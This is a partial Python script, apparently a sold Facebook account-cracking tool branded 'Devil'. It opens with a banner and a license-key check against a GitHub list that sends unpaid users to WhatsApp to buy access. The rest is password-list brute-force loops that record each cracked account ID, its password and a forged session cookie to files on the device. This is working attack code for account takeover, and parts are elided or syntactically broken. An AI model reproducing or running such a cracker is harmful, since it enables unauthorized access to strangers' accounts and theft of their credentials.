...
{A}#########  ###     ### ###    ###  ########   ########  \033[0;41m𝙀𝙢𝙤𝙣\033[0;92m
 {G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 {R}❲{G}😇{R}❳{G} 𝘿𝙀𝙑𝙀𝙇𝙊𝙋𝙀𝙍 {R}:{G} Devil☬
 {R}❲{G}💚{R}❳{G} 𝙁𝘼𝘾𝙀𝘽𝙊𝙊𝙆  {R}:{G}Devil
 {R}❲{G}😻{R}❳{G} 𝙑𝙀𝙍𝙎𝙄𝙊𝙉   {R}:{G}   100
...
def approval():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/devil-billa/Masum69/blob/main/devil.txt).text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%2I%20Want%20To%20Buy%20This%20Tools%20My%20Key%20:%20'+id);os.system('am start https://wa.me/+880******?text='+tks)
      time.sleep(1)
      exit()
  except:
    sys.exit()
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G} IDevil🥰-OK{R}❳{G} '+uid+f' {R}|{G} '+pas)
                    Emon(uid,pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'Devil-FILE-M1-OK.txt')
                    open('/sdcard/XD/Devil-FILE-M1-OK-COOKIE.txt','a').write(uid+' | '+pas+' |------> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
                    ...
                    uid = str(po['error']['error_data']['uid'])
                    print(f'\r{R}❲{Y}Devil🥰-CP{R}❳{Y} '+uid+f' {R}|{Y} '+pas+'\033[1;97m')
                    file_path = os.path.join(folder_path, 'Devil-FILE-M1-CP.txt')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    cps.append(uid)
                    break
    ...
    try:
        ...
        for pw in passlist:
            ...
            if 'session_key' in po:
                    ...
                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
                    cookie = f"sb={ssbb};{ckkk}"
                    print(f'\r{R}❲{G}Devil🥰-OK{R}❳ '+uid+f' {R}|{G} '+pas)
                    Emon(uid,pas)
                    print(f"\r{R}❲{G}COOKIE{R}❳{A}->{G} {cookie}")
                    file_path = os.path.join(folder_path, 'Devil-FILE-M2-OK.txt')
                    open('/sdcard/XD/Devil-FILE-M2-OK-COOKIE.txt','a').write(uid+' | '+pas+' |----> '+cookie+'\n')
                    with open(file_path, 'a') as file:
                        file.write(uid+' | '+pas+'\n')
                    oks.append(uid)
                    break
